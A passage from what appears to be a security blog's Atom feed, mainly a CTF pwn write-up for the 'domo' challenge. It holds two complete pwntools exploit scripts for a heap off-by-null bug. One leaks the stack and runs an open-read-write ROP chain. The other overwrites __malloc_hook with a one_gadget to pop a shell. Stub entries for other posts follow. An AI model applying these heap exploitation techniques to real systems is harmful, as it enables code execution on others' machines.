class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+va9hqwHu9Nsz1hZkjsQ40zNgYpVTN1oo= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.000Z</updated>
    
